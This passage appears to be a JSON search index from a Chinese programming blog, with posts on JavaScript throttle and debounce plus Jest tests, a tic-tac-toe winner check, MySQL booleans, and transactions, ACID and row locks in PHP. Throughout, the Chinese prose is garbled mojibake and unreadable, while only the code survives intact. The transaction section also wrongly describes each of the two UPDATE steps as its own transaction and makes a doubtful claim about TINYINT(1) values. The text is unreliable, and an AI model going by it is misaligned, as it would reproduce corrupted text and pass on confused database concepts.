çš„æ¦‚å¿µå¯ä»¥æƒ³æˆæ˜¯ä¸€æ‰‡é–€ï¼Œç•¶æœ‰ä¸€å€‹äººé€šéé€™æ‰‡é–€ï¼Œé€™æ‰‡é–€å°±æœƒé—œèµ·ä¾†ï¼Œå¿…é ˆç­‰ä¸€æ®µæ™‚é–“å¾Œé€™æ‰‡é–€æ‰æœƒå†æ¬¡æ‰“é–‹ï¼Œè®“ä¸‹ä¸€å€‹äººé€šéã€‚throttle å°±æ˜¯ä¸€ç›´å¾ªç’°é€™å€‹æµç¨‹ï¼š æœ‰äººé€šé &gt; æŠŠé–€é—œèµ·ä¾† &gt; ç­‰å¾… n ç§’ &gt; æŠŠé–€æ‰“é–‹ æ‰€ä»¥åˆ©ç”¨ throttle å°±èƒ½æ§åˆ¶æ¯éš”å¹¾ç§’è®“ä¸€å€‹äººé€šéï¼Œé€™å°±æ˜¯å®ƒçš„ç”¨é€”ã€‚ å›åˆ°å‰ç«¯çš„éƒ¨åˆ†ï¼Œé€™å¯ä»¥ç”¨åœ¨ä½ ä¸å¸Œæœ›ã€ŒæŸå€‹äº‹ä»¶åœ¨çŸ­æ™‚é–“å…§é‡è¤‡è§¸ç™¼ã€ï¼Œä¾‹å¦‚æœ€å¸¸è¦‹çš„ï¼šscrollï¼š å…ˆä¾†çœ‹æ²’æœ‰ throttle çš„æƒ…æ³ï¼š åŠ äº† throttle ä»¥å¾Œï¼ˆdelay æ™‚é–“ç‚º 250msï¼‰ï¼š å¯¦ä½œ throttleé€™é‚Šçš„å¯¦ä½œæ–¹å¼æ˜¯å¯«ä¸€å€‹ throttle å‡½å¼ï¼Œæ¥æ”¶å…©å€‹åƒæ•¸ï¼š fn è¦åŸ·è¡Œçš„ function delay è¦ç­‰å¾…çš„æ™‚é–“ æŠŠ function ä¸Ÿé€²å»å¾Œæœƒå›å‚³ä¸€å€‹æ–°çš„ functionï¼Œé€™å€‹ function å¿…é ˆæ¯éš”å¹¾ç§’æ‰èƒ½ call ä¸€æ¬¡ã€‚ 12345678910111213141516function throttle (fn, delay) { let isTimeout = true; function newFunc (...argu) { // å¦‚æœé–€æ˜¯é–‹è‘—çš„ if (isTimeout) { // æŠŠé–€é—œä¸Š isTimeout = false; // call function fn(...argu); // å¹¾ç§’å¾Œå†æŠŠé–€é‡æ–°æ‰“é–‹ setTimeout(() =&gt; isTimeout = true, delay) } } return newFunc}module.exports = throttle; é€™é‚Šè¢«é—œåœ¨é–‰åŒ…ä¸­çš„è®Šæ•¸ç‚ºï¼šisTimeoutã€delay å’Œ fn æœ€å¾Œé™„å€‹æ¸¬è©¦æª”ï¼š 12345678910111213141516171819202122232425262728293031323334const throttle = require('./throttle');describe(\"throttle\", () =&gt; { it('can not retrigger function during the time', async () =&gt; { // æ›¿èº« functionï¼Œé è¨­å›å‚³å€¼ç‚º undefined const fn = jest.fn(); const throttleFn = throttle(fn, 250); // å‘¼å«ç¬¬ä¸€æ¬¡ throttleFn(10); // æª¢æŸ¥ç¬¬ä¸€æ¬¡æ˜¯å¦æœ‰åŸ·è¡Œ expect(fn).toHaveBeenCalledWith(10); // å‘¼å«æ¬¡æ•¸ï¼š1 expect(fn.mock.calls.length).toBe(1); // ç­‰å¾… delay await sleep(250); // å†å‘¼å«ä¸€æ¬¡ï¼Œçœ‹çœ‹æ˜¯å¦åŸ·è¡Œ throttleFn(20) expect(fn).toHaveBeenCalledWith(20); // å‘¼å«æ¬¡æ•¸ï¼š2 expect(fn.mock.calls.length).toBe(2); // ç­‰å¾… delay await sleep(250); // å¤šæ¬¡å‘¼å«ï¼ŒçœŸæ­£è¢«å‘¼å«çš„æ‡‰è©²åªæœ‰ç¬¬ä¸€å€‹ throttleFn(\"b\", \"a\"); for (let i=1; i&lt;=100; i++) { throttleFn(\"a\", \"b\", \"c\"); } expect(fn).toHaveBeenCalledWith('b', 'a'); // å‘¼å«æ¬¡æ•¸ï¼š3 expect(fn.mock.calls.length).toBe(3); })}) debouncedebounce çš„ç›´ç¿»æ˜¯ã€Œé˜²æŠ–ã€ã€‚ debounce è·Ÿ throttle çš„æ¦‚å¿µæœ‰é»ã€Œé¡ä¼¼ã€ï¼ˆåªæ˜¯è§€å¿µé¡ä¼¼ï¼Œä½†ç”¨é€”å·®å¾ˆå¤šï¼‰ï¼Œä½†æˆ‘æš«æ™‚æƒ³ä¸åˆ°æ¯”è¼ƒç”Ÿæ´»åŒ–çš„ä¾‹å­ï¼Œæ‰€ä»¥ç›´æ¥æ‹¿å‰ç«¯çš„å¯¦éš›æ‡‰ç”¨ä¾†èˆ‰ä¾‹ã€‚ ç”¨é google æœå°‹çš„è©±æ‡‰è©²éƒ½çŸ¥é“è¼¸å…¥æ–‡å­—æ™‚æœƒæœ‰ auto complete çš„åŠŸèƒ½ï¼š é€™å€‹åŠŸèƒ½çš„å¯¦ä½œå¤§æ¦‚æœƒé•·é€™æ¨£ï¼š 1234567$('input').on('input', async function () { // å–å¾—è¼¸å…¥å…§å®¹ const value = this.value; // ç™¼ request åˆ°å¾Œç«¯æ‹¿è³‡æ–™ï¼ˆç›¸é—œçš„é—œéµå­—ï¼‰ const result = await getAutoComplete(value); // æŠŠçµæœæ¸²æŸ“åˆ°ç•«é¢ä¸Š...}) ä½†é€™æ¨£æœ‰å€‹å•é¡Œï¼Œå¦‚æœæœå°‹ã€ŒèŠ±ç”Ÿé†¬æ‰¹ç™¼ã€ï¼Œç¨‹å¼æœƒé€™æ¨£è·‘ï¼š 12345678910111213141516171819å–å¾—é—œéµå­—ã€ŒèŠ±ã€ç™¼ request æŸ¥è©¢è·Ÿã€ŒèŠ±ã€ç›¸é—œçš„é—œéµå­—æŠŠçµæœæ¸²æŸ“åˆ°ç•«é¢ä¸Šå–å¾—é—œéµå­—ã€Œç”Ÿã€ç™¼ request æŸ¥è©¢è·Ÿã€Œç”Ÿã€ç›¸é—œçš„é—œéµå­—æŠŠçµæœæ¸²æŸ“åˆ°ç•«é¢ä¸Šå–å¾—é—œéµå­—ã€Œé†¬ã€ç™¼ request æŸ¥è©¢è·Ÿã€Œé†¬ã€ç›¸é—œçš„é—œéµå­—æŠŠçµæœæ¸²æŸ“åˆ°ç•«é¢ä¸Šå–å¾—é—œéµå­—ã€Œæ‰¹ã€ç™¼ request æŸ¥è©¢è·Ÿã€Œæ‰¹ã€ç›¸é—œçš„é—œéµå­—æŠŠçµæœæ¸²æŸ“åˆ°ç•«é¢ä¸Šå–å¾—é—œéµå­—ã€Œé†¬ã€ç™¼ request æŸ¥è©¢è·Ÿã€Œç™¼ã€ç›¸é—œçš„é—œéµå­—æŠŠçµæœæ¸²æŸ“åˆ°ç•«é¢ä¸Š å•é¡Œæ˜¯æŒ‡æˆ‘æ¯æ‰“ä¸€å€‹å­—ï¼Œå°±æœƒç™¼ä¸€å€‹ request åˆ°å¾Œç«¯å»ã€‚ é€™æ¨£å­çš„æ•ˆèƒ½ä¸å¥½ï¼Œæ˜æ˜æˆ‘åªæ˜¯æƒ³æœå°‹ã€ŒèŠ±ç”Ÿé†¬æ‰¹ç™¼ã€è€Œå·²ï¼Œå»è¦ç™¼ 5 æ¬¡ requestã€‚ æ¯”è¼ƒå¥½çš„åšæ³•æ˜¯ï¼š åœ¨è¼¸å…¥æ–‡å­—æ™‚ï¼Œå…ˆè¨­å®šä¸€æ®µæ™‚é–“ï¼ˆé€™æ®µæ™‚é–“è¢«ç¨±ç‚ºã€Œthreshold é–¾å€¼ã€ï¼‰ï¼Œåœ¨é€™æœŸé–“è¼¸å…¥æ–‡å­—çš„è©±å°±å¾—é‡æ–°ç­‰å¾…ï¼Œå¿…é ˆç­‰åˆ°æ™‚é–“çµæŸæ™‚éƒ½æ²’æœ‰è¼¸å…¥æ–‡å­—ï¼Œæ‰æœƒç™¼ request å»æ‹¿è³‡æ–™ã€‚ é€™å€‹å°±æ˜¯ debounce çš„ä½œç”¨ã€‚ æ¥è‘—ä¾†æ¼”ç¤ºä¸€æ®µæ²’æœ‰ debounce çš„æƒ…æ³ï¼š åŠ äº† debounce ä»¥å¾Œï¼š å¯¦ä½œ debounceé€™é‚Šä¸€æ¨£æœƒå¯¦ä½œä¸€å€‹å‡½å¼ debounceï¼Œæ¥æ”¶å…©å€‹åƒæ•¸ï¼š fn è¦åŸ·è¡Œçš„å‡½å¼ delay è¦ç­‰å¾…çš„æ™‚é–“ æŠŠ function ä¸Ÿé€²å»å¾Œæœƒå›å‚³ä¸€å€‹æ–°çš„ functionï¼Œé€™å€‹ function æœƒä»¥ debounce çš„æ–¹å¼ä¾†åŸ·è¡Œï¼š 1234567891011function debounce(fn, delay) { let timer = null; function newFunc (...argu) { if (timer) { clearTimeout(timer); } timer = setTimeout(() =&gt; fn(...argu), delay); } return newFunc;}module.exports = debounce; ä¸€æ¨£é™„ä¸Šæ¸¬è©¦æª”ï¼š 1234567891011121314151617181920212223242526272829303132const debounce = require('./debounce');describe(\"debounce\", () =&gt; { it('should trigger function after certain delay', async () =&gt; { // æ›¿èº« functionï¼Œé è¨­å›å‚³å€¼ç‚º undefined const fn = jest.fn(); const debouncedFn = debounce(fn, 250); debouncedFn(10); // é‚„ä¸èƒ½è¢«å‘¼å« expect(fn).not.toHaveBeenCalledWith(); // ç­‰å¾… delay await sleep(250); // æª¢æŸ¥å‘¼å«æ™‚å‚³å…¥çš„åƒæ•¸æ˜¯å¦ç‚º 10 expect(fn).toHaveBeenCalledWith(10); // æª¢æŸ¥å‘¼å«æ¬¡æ•¸æ˜¯å¦ç‚ºä¸€æ¬¡ expect(fn.mock.calls.length).toBe(1); // å¤šæ¬¡å‘¼å« debouncedFn(\"b\", \"a\"); debouncedFn(\"d\", \"e\"); debouncedFn(\"a\", \"b\", \"c\"); expect(fn.mock.calls.length).toBe(1); // ç­‰å¾… delay await sleep(250); // æª¢æŸ¥å‘¼å«æ¬¡æ•¸æ˜¯å¦ç‚ºå…©æ¬¡ï¼ˆåŠ ä¸Šå‰é¢çš„ï¼‰ expect(fn.mock.calls.length).toBe(2); // æª¢æŸ¥å‘¼å«æ™‚å‚³å…¥çš„åƒæ•¸æ˜¯å¦ç‚º a b cï¼ˆç¢ºèªæ˜¯æœ€å¾Œä¸€å€‹ functino è¢«å‘¼å«ï¼‰ expect(fn).toHaveBeenCalledWith(\"a\", \"b\", \"c\"); })})","link":"/2022/03/21/throttle-and-debounce/"},{"title":"åœˆåœˆå‰å‰","text":"ä¾†è‡ª LIOJ ä¸Šçš„é¡Œç›®ã€‚é€™é¡Œåœ¨è€ƒäºŒç¶­é™£åˆ—çš„æ‡‰ç”¨ï¼Œè¦ºå¾—é‚„çœŸçš„è »å®¹æ˜“ææ··çš„ï¼Œæ‰€ä»¥æƒ³è¨˜éŒ„ä¸‹ä¾†ã€‚ è§£é¡Œæ–¹å‘æœ€ç°¡å–®çš„æ–¹å¼å°±æ˜¯çª®èˆ‰æ‰€æœ‰æœƒè´çš„å¯èƒ½ï¼š 12345678910111213141516171819OOO------- O O O------- O O O-------O O O------- O OO é—œæ–¼äºŒç¶­é™£åˆ—ç”±æ–¼æ‹¿åˆ°çš„è³‡æ–™æœƒæ˜¯ ['ooo', 'xxo', 'xxo']ï¼Œæ‰€ä»¥å¦‚æœè¦å–å‡ºæ¯ä¸€è¡Œçš„å­—ä¸²çš„è©±ï¼š 123'ooo' // lines[0]'xxo' // lines[1]'xxo' // lines[2] å¦‚æœè¦å–å‡ºæ¯è¡Œçš„ä¸€å€‹å­—å…ƒçš„è©±ï¼š 123456789101112ooo'o' // lines[0][0]'o' // lines[0][1]'o' // lines[0][2]xxo'x' // lines[1][0]'x' // lines[1][1]'o' // lines[1][2]xxo'x' // lines[2][0]'x' // lines[2][1]'o' // lines[2][2] ï¼ˆä¸Šä¸‹ä¸€èµ·å°ç…§è‘—çœ‹ï¼Œæ¯”è¼ƒä¸æœƒææ··ï¼‰ å¦‚æœç¾åœ¨æˆ‘å€‘æƒ³è¦çœ‹ã€Œæ©«æ’ã€çš„æ¯ä¸€å€‹å­—å…ƒæœ‰æ²’æœ‰ç›¸åŒï¼Ÿæœƒç™¼ç¾å¯ä»¥åˆ©ç”¨è¿´åœˆä¾†åšï¼š 12345for(let i=0; i&lt;3; i++) { if(lines[i][0] === lines[i][1] &amp;&amp; lines[i][1] === lines[i][2]) { return lines[i][0] }} æ¯ä¸€è¡Œè¦æª¢æŸ¥çš„å­—å…ƒéƒ½å›ºå®šç‚º [0][1][2]ï¼Œéœ€è¦æ”¹è®Šçš„åªæœ‰å‰é¢ä»£è¡¨ã€Œè¡Œæ•¸ã€çš„ç´¢å¼•å€¼ã€‚ åéä¾†ï¼Œå¦‚æœè¦çœ‹ã€Œç›´æ’ã€çš„æ¯ä¸€å€‹å­—å…ƒæœ‰æ²’æœ‰ç›¸åŒï¼Ÿä¹Ÿå¯ä»¥ç”¨è¿´åœˆä¾†åšï¼š 1234567891011'o' // lines[0][0]'x' // lines[1][0]'x' // lines[2][0]'o' // lines[0][1]'x' // lines[1][1]'x' // lines[2][1]'o' // lines[0][2]'o' // lines[1][2]'o' // lines[2][2] 12345for(let i=0; i&lt;3; i++) { if(lines[0][i] === lines[1][i] &amp;&amp; lines[1][i] === lines[2][i]) { return lines[0][i] }} æ¯ä¸€å€‹å­—å…ƒè¦æª¢æŸ¥çš„å›ºå®šè¡Œæ•¸ç‚º [0][1][2]ï¼Œéœ€è¦æ”¹è®Šçš„åªæœ‰å¾Œé¢ä»£è¡¨ã€Œå­—å…ƒã€çš„ç´¢å¼•å€¼ã€‚ æ‰€ä»¥é€™æ¨£å°±è™•ç†å®Œã€Œæ©«æ’ã€è·Ÿã€Œç›´æ’ã€çš„éƒ¨åˆ†äº†ï¼Œæ¥ä¸‹ä¾†åªè¦æŠŠã€Œæ–œæ’ã€çš„éƒ¨åˆ†ä¹Ÿåšå®Œå°±æå®šï¼š 1234567'o' // lines[0][0]'x' // lines[1][1]'o' // lines[2][2]'o' // lines[0][2]'x' // lines[1][1]'x' // lines[2][0] é€™è£¡æ²’æœ‰è¾¦æ³•å¯«æˆè¿´åœˆï¼Œæ‰€ä»¥ç›´æ¥åˆ¤æ–·å°±å¥½ï¼š 123456if(lines[0][0] === lines[1][1] &amp;&amp; lines[1][1] === lines[2][2]) { return lines[0][0]}if(lines[0][2] === lines[1][1] &amp;&amp; lines[1][1] === lines[2][0]) { return lines[0][2]} å·¥å…·éƒ½å‚™å¥½äº†ï¼Œæœ€å¾Œåªè¦é›†åˆèµ·ä¾†å°±å®Œæˆå›‰ï¼š 123456789101112131415161718192021222324function whoWin(lines) { // æ©«æ’ for(let i=0; i&lt;3; i++) { if(lines[i][0] === lines[i][1] &amp;&amp; lines[i][1] === lines[i][2]) { return lines[i][0] } } // ç›´æ’ for(let i=0; i&lt;3; i++) { if(lines[0][i] === lines[1][i] &amp;&amp; lines[1][i] === lines[2][i]) { return lines[0][i] } } // æ–œæ’ if(lines[0][0] === lines[1][1] &amp;&amp; lines[1][1] === lines[2][2]) { return lines[0][0] } if(lines[0][2] === lines[1][1] &amp;&amp; lines[1][1] === lines[2][0]) { return lines[0][2] } // ä»¥ä¸Šéƒ½æ²’æœ‰é€šéï¼Œä»£è¡¨å¹³æ‰‹ return 'DRAW'} å¦ä¸€ç¨®é¸æ“‡å¦‚æœäºŒç¶­é™£åˆ—ä¸å¥½ç†è§£çš„è©±ï¼Œä½ ä¹Ÿå¯ä»¥æŠŠè³‡æ–™è½‰æ›æˆä¸€è¡Œå­—ä¸²ï¼Œä¾‹å¦‚èªª 'oooxxoxxo'ï¼Œæ¥è‘—åœ¨ç…§è‘—ä¸Šé¢çš„åšæ³•ä¹Ÿæ˜¯ okã€‚ å…ˆç”¨æ•¸å­—è¡¨ç¤ºä½ç½®ï¼š 1234567o o ox x ox x o0 1 23 4 56 7 8 æ©«æ’çš„æƒ…æ³ï¼š 1230 1 23 4 56 7 8 12345678910let str = 'oooxxoxxo'for(let i=0; i&lt;3; i++) { // i=0 =&gt; n=0 // i=1 =&gt; n=3 // i=2 =&gt; n=6 let n = i*3 if(str[n] === str[n+1] &amp;&amp; str[n+1] === str[n+2]) { return str[n] }} ç›´æ’çš„æƒ…æ³ï¼š 1230 3 61 4 72 5 8 123456789let str = 'oooxxoxxo'for(let i=0; i&lt;3; i++) { // i=0 =&gt; 0 3 6 // i=1 =&gt; 1 4 7 // i=2 =&gt; 2 5 8 if(str[i] === str[i+3] &amp;&amp; str[i+3] === str[i+6]) { return str[i] }} æ–œæ’çš„æƒ…æ³ï¼š 120 4 82 4 6 123let str = 'oooxxoxxo'if(str[0] === str[4] &amp;&amp; str[4] === str[8]) return str[0]if(str[2] === str[4] &amp;&amp; str[4] === str[6]) return str[2] æœ€å¾Œä¸€æ¨£çµ„åˆèµ·ä¾†å°±å¤§åŠŸå‘Šæˆï¼š 12345678910111213141516171819202122232425262728function whoWin(str) { // æ©«æ’ for(let i=0; i&lt;3; i++) { // i=0 =&gt; n=0 // i=1 =&gt; n=3 // i=2 =&gt; n=6 let n = i*3 if(str[n] === str[n+1] &amp;&amp; str[n+1] === str[n+2]) { return str[n] } } // ç›´æ’ for(let i=0; i&lt;3; i++) { // i=0 =&gt; 0 3 6 // i=1 =&gt; 1 4 7 // i=2 =&gt; 2 5 8 if(str[i] === str[i+3] &amp;&amp; str[i+3] === str[i+6]) { return str[i] } } // æ–œæ’ if(str[0] === str[4] &amp;&amp; str[4] === str[8]) return str[0] if(str[2] === str[4] &amp;&amp; str[4] === str[6]) return str[2] // å¹³æ‰‹ return 'DRAW'}","link":"/2021/12/28/tic-tac-toe/"},{"title":"é—œæ–¼ MySQL ä¸­çš„ boolean","text":"å°çŸ¥è­˜ã€‚ ç°¡è¿°å…¶å¯¦ boolean åªæ˜¯æŠŠ TINYINT é•·åº¦è¨­ç‚º 1 çš„åˆ¥åï¼ˆAliasï¼‰ï¼Œæ‰€ä»¥ä½ å…¶å¯¦ä¹Ÿå¯ä»¥è‡ªå·±è¨­ï¼š é•·åº¦ 1 ä»£è¡¨åªå¯èƒ½å‡ºç¾ 0 ~ 9ï¼Œæ‰€ä»¥åªè¦ä¸æ˜¯ 0 éƒ½ä»£è¡¨ trueã€‚","link":"/2022/02/14/tiny-int-and-boolean/"},{"title":"è³‡æ–™åº«ä¸­çš„ Transactionã€ACID å’Œ Lock","text":"æœ‰è¶£çš„æ±è¥¿ã€‚ ACID èˆ‡ Transactionæˆ‘è¦ºå¾—åœ¨è¬› ACID ä¹‹å‰ï¼Œå…ˆç†è§£ transaction æ˜¯ä»€éº¼æœƒæ¯”è¼ƒæœ‰å¹«åŠ©ï¼Œæ‰€ä»¥é€™è£¡å…ˆè§£é‡‹ä¸€ä¸‹ transaction æ˜¯ä»€éº¼ã€‚ å…ˆä¾†çœ‹ä¸€ä¸‹ç¶­åŸºç™¾ç§‘å° transaction çš„å®šç¾©ï¼š è³‡æ–™åº«äº¤æ˜“ï¼ˆç°¡ç¨±ï¼šäº¤æ˜“ï¼‰æ˜¯è³‡æ–™åº«ç®¡ç†ç³»çµ±åŸ·è¡Œéç¨‹ä¸­çš„ä¸€å€‹é‚è¼¯å–®ä½ï¼Œç”±ä¸€å€‹æœ‰é™çš„è³‡æ–™åº«æ“ä½œåºåˆ—æ§‹æˆã€‚ å¥½ï¼Œæ‡‰è©²æœ‰çœ‹æ²’æœ‰æ‡‚ï¼Œæˆ‘ä¹Ÿä¸€æ¨£ã€‚ ç¸½ä¹‹å‘¢ï¼Œé€™é‚Šåªè¦æŠŠé‡é»æ”¾åœ¨ã€Œå–®ä½ã€é€™å€‹è©å°±å¥½ã€‚å¯æ˜¯é‚„æ˜¯æœ‰é»æŠ½è±¡ï¼Œä»€éº¼å«åšå–®ä½ï¼Ÿ ä¾†èˆ‰å€‹ä¾‹å­å§ï¼Œå‡è¨­æˆ‘æœ‰ä¸€å€‹æ“ä½œæ˜¯ã€ŒæŠŠ A è½‰ 20 å¡Šçµ¦ Bã€ï¼Œè¦å®Œæˆé€™é …æ“ä½œæœƒéœ€è¦å…©å€‹ SQL æŒ‡ä»¤ï¼š æŠŠ A çš„éŒ¢æ‰£ 20 å¡Š æŠŠ B çš„éŒ¢åŠ  20 å¡Š æˆ‘å€‘æœƒæŠŠ 1 è·Ÿ 2 éƒ½ç•¶æˆæ˜¯ä¸€å€‹ transactionï¼Œç¬¬ä¸€å€‹ transaction æ˜¯ã€ŒæŠŠ A çš„éŒ¢æ‰£ 20 å¡Šã€ï¼Œå¦ä¸€å€‹æ˜¯ã€ŒæŠŠ B çš„éŒ¢åŠ  20 å¡Šã€ã€‚æ‰€ä»¥èªªå‘¢ï¼Œç¾åœ¨æœ‰ã€Œå…©å€‹ã€transactionï¼Œé€™å€‹å°±æ˜¯å–®ä½çš„æ„æ€ã€‚ å¥½ï¼Œé€™è·Ÿ ACID åˆæœ‰ä»€éº¼é—œä¿‚ï¼Ÿ é€™è¦å…ˆè«‡ä¸€ä¸‹ transaction æœ¬èº«çš„å•é¡Œï¼Œæœ‰äº›æ™‚å€™æˆ‘å€‘ç„¡æ³•ç¢ºä¿ä¸€å€‹ transaction çš„çµæœæœƒå¦‚æˆ‘å€‘æ‰€æƒ³ã€‚åƒä¸Šé¢çš„ä¾‹å­ï¼Œå¦‚æœ A åªæœ‰ 20 å¡Šï¼Œåœ¨ A çš„éŒ¢é‚„æ²’è¢«æ‰£æ‰æ™‚ï¼Œçªç„¶åˆæ’å…¥ä¸€å€‹æ–°çš„æ“ä½œæ˜¯æŠŠ A çš„éŒ¢è½‰çµ¦ Cï¼Œé€™å€‹æ™‚å€™å°±æœ‰å¯èƒ½å‡ºç¾æ˜æ˜ A åªæœ‰ 20 å¡Šå»è½‰äº† 40 å¡Šçµ¦ B å’Œ C çš„çµæœç™¼ç”Ÿã€‚ é€™æ¨£çš„ transaction æ˜¯ä¸å¥½çš„ï¼Œæˆ‘å€‘å¸Œæœ›ç›¡é‡é¿å…é€™ç¨®äº‹æƒ…ç™¼ç”Ÿï¼Œæ‰€ä»¥æ‰å»ºç«‹äº†ä¸€å¥—åŸå‰‡ï¼Œå°±æ˜¯ ACIDï¼š Atomicity åŸå­æ€§ï¼šè¦å˜›å…¨éƒ¨æˆåŠŸ or å¤±æ•— Consistency ä¸€è‡´æ€§ï¼šè³‡æ–™çš„ç¸½æ•¸è¦ä¸€æ¨£ï¼Œä¾‹å¦‚ A è·Ÿ B çš„éŒ¢åŸæœ¬åŠ èµ·ä¾†æœ‰ 100 å¡Šï¼Œé‚£ä¸ç®¡ä»–å€‘è½‰å¹¾æ¬¡å¸³ï¼Œæœ€å¾ŒåŠ èµ·ä¾†æ‡‰è©²ä¹Ÿè¦æ˜¯ 100 å¡Š Isolation éš”é›¢æ€§ï¼šA ä¸€æ¬¡åªèƒ½è½‰å¸³çµ¦ä¸€å€‹äººï¼Œå¦‚æœè¦è½‰å¸³çµ¦ä¸‹å€‹äººï¼Œå°±è¦ç­‰ä¸Šå€‹äººçµæŸå¾Œå†è½‰çµ¦ä¸‹å€‹äººã€‚ Durability æŒä¹…æ€§ï¼šå¯«å…¥çš„è³‡æ–™è¦æ”¾åœ¨ä¸€å€‹å¯ä»¥æ°¸ä¹…ä¿å­˜çš„åœ°æ–¹ é€™é‚Šå¯èƒ½æ¯”è¼ƒæŠ½è±¡ï¼Œä¸éæˆ‘è¦ºå¾—åªè¦çŸ¥é“ ACID æ˜¯ç”¨ä¾†ç¢ºä¿ transaction çš„çµæœå¯ä»¥æŒ‰ç…§æˆ‘å€‘æ‰€æƒ³ï¼Œé€™ä¸€é»å°±å¤ äº†ã€‚å°ˆæœ‰åè©çš„éƒ¨åˆ†åªè¦çœ‹å€‹æ¦‚å¿µå°±å¥½ï¼Œä¸ç”¨ä¸€å®šè¦å®Œå…¨ç†è§£ã€‚ æ€éº¼åœ¨ PHP ä½¿ç”¨ transaction1234567# é è¨­æ˜¯ trueï¼Œä¸€å€‹ query å°±æ˜¯ç•¶æˆä¸€å€‹ transaction$conn-&gt;autocommit(FALSE);$conn-&gt;begin_transaction();$conn-&gt;query(\"UPDATE money set amount = 20\");$conn-&gt;query(\"UPDATE money set sum = 20\");// åˆ°é€™ä¸€è¡Œæ‰æ˜¯çœŸçš„åŸ·è¡Œï¼Œæ‰€ä»¥æœƒæŠŠä¸Šé¢å…©å€‹ query ç•¶æˆä¸€å€‹ transaction$conn-&gt;commit(); æµç¨‹ï¼š ä¸Šé¢å…©å€‹ query æœƒåŒæ™‚åŸ·è¡Œï¼Œè€Œä¸”ä¿è­‰éƒ½æˆåŠŸ or å¤±æ•— å¦‚æœæœ‰å¾ˆå¤šå€‹ query å¯ä»¥åˆ©ç”¨é€™ç¨®æ–¹å¼ä¾†åŸ·è¡Œï¼Œæ•ˆèƒ½æœƒæ¯”è¼ƒå¥½ã€‚ é™„è¨»ï¼šå¦‚æœè¦ç”¨ transaction çš„åŠŸèƒ½ï¼Œè¦å…ˆç¢ºèªè³‡æ–™åº«çš„å¼•æ“æ˜¯ä»€éº¼ã€‚ ä»¥ MySQL å’Œ MariaDB ä¾†èªªæ˜¯ innoDBï¼Œé€™å…©å€‹æœ‰æ”¯æ´ã€‚ä½†å¦‚æœæ˜¯ MyISAN å°±ä¸æ”¯æ´ã€‚ lockç›´æ¥èˆ‰ä¾‹å­æœƒæ¯”è¼ƒå¥½æ‡‚ä¸€é»ï¼Œå…ˆä¾†æ®µç¨‹å¼ç¢¼ï¼š 12345678910111213141516171819require_once('conn.php');$stmt = $conn-&gt;prepare(\"SELECT amount from products where id = 1 for update\");$stmt-&gt;execute();$result = $stmt-&gt;get_result();// æœ‰æŠ“åˆ°è³‡æ–™å°±é¡¯ç¤º amount æ•¸é‡if ($result-&gt;num_rows &gt; 0) { $row = $result-&gt;fetch_assoc(); echo \"amount: \" . $row['amount']; // amount &gt; 0 çš„è©±å°±ç™¼ä¸€å€‹ query æŠŠ amount - 1 if ($row['amount'] &gt; 0) { $stmt = $conn-&gt;prepare(\"UPDATE products SET amount = amount - 1 WHERE id = 1\"); if ($stmt-&gt;execute()) { echo 'è³¼è²·æˆåŠŸ'; } }}$conn-&gt;commit(); æŠŠä¸Šé¢é€™æ®µæƒ³æˆæ˜¯ã€Œæ¶é–€ç¥¨çš„ç³»çµ±ã€ï¼Œè€Œç¾åœ¨åªå‰©ä¸‹ä¸€å¼µç¥¨ã€‚æ¥è‘—å†å‡è¨­ç¾åœ¨æœ‰ 10 å€‹äººã€ŒåŒæ™‚ã€å°ç³»çµ±ç™¼å‡º requestï¼Œé‚£æœƒç™¼ç”Ÿä»€éº¼äº‹ï¼Ÿ é€™é‚Šç”¨ Apache JMeter ä¾†åšæ¸¬è©¦ï¼š å¯ä»¥çœ‹åˆ°æœ€å¾Œæœ‰ 3 å€‹äººéƒ½è²·åˆ°ç¥¨äº†ï¼Œç‚ºä»€éº¼æœƒé€™æ¨£ï¼Ÿé€™å€‹å«åš race conditionï¼Œå¯ä»¥åƒè€ƒæˆ‘å¯«çš„é€™ç¯‡æ–‡ç« ï¼šç†è§£ä»€éº¼æ˜¯ race-conditionã€‚ ç¸½ä¹‹å‘¢ï¼Œé€™æ¨£æœƒé€ æˆè¶…è³£çš„å•é¡Œï¼Œé€™æ˜é¡¯å•é¡Œå¾ˆå¤§ã€‚æ‰€ä»¥æ‰è¦æœ‰ã€ŒLockã€æ©Ÿåˆ¶ã€‚ ç°¡å–®ä¾†èªªï¼Œlock å°±æ˜¯åœ¨ä¸€å€‹ transaction é‚„æ²’å®Œæˆä»¥å‰éƒ½çµ¦é–ä½ï¼Œè®“å®ƒä¸èƒ½åšå…¶ä»–äº‹æƒ…ã€‚é€™æ¨£æ‰èƒ½é¿å…æ‰åƒä¸Šé¢é‚£ç¨®å•é¡Œã€‚ æ‰€ä»¥å¯ä»¥é€™æ¨£æ”¹å¯«ç¨‹å¼ç¢¼ï¼š é™„è¨»ï¼šè¨˜å¾— lock å¿…é ˆæ­é… transaction æ‰å¯ä»¥ç”¨ 123456789101112131415161718192021// é—œé–‰è‡ªå‹• commit $conn-&gt;autocommit(false);// å»ºç«‹ä¸€å€‹ transaction$conn-&gt;begin_transaction();// åŠ ä¸Š lock (å¾Œé¢çš„ for updata)$stmt = $conn-&gt;prepare(\"SELECT amount from products where id = 1 for update\");$stmt-&gt;execute();$result = $stmt-&gt;get_result();if ($result-&gt;num_rows &gt; 0) { $row = $result-&gt;fetch_assoc(); echo \"amount: \" . $row['amount']; if ($row['amount'] &gt; 0) { $stmt = $conn-&gt;prepare(\"UPDATE products SET amount = amount - 1 WHERE id = 1\"); if ($stmt-&gt;execute()) { echo 'è³¼è²·æˆåŠŸ'; } }}// çœŸæ­£é€å‡º$conn-&gt;commit(); ä¸€æ¨£ç”¨ Apache JMeter ä¾†æ¸¬è©¦ï¼š ç¾åœ¨çœŸçš„åªæœƒæœ‰ä¸€å€‹äººæ¶åˆ°ç¥¨äº†ï¼Œä¸æœƒå†æœ‰è¶…è³£çš„å•é¡Œã€‚ ä»¥ä¸Šå°±æ˜¯ lock çš„ä½œç”¨ã€‚å¦å¤–åœ¨ç¯„ä¾‹è£¡æœ‰æŒ‡å®š id = 1ï¼Œé€™å€‹å«åšã€Œrow lockã€ï¼Œä»£è¡¨æ˜¯ä»¥ row ç‚ºå–®ä½ã€‚å¦‚æœæƒ³ä»¥ table ç‚ºå–®ä½ä¹Ÿæ˜¯ OK çš„ï¼ŒæŠŠ id = 1 æ‹¿æ‰å°±è¡Œäº†ï¼Œé€™æ¨£å°±æœƒ lock ä½æ•´å€‹ tableï¼Œè®Šæˆã€Œtable lockã€ã€‚ ä¸éè¦æ³¨æ„ç”¨ lock çš„è©±æœƒæœ‰æ•ˆèƒ½å•é¡Œã€‚å› 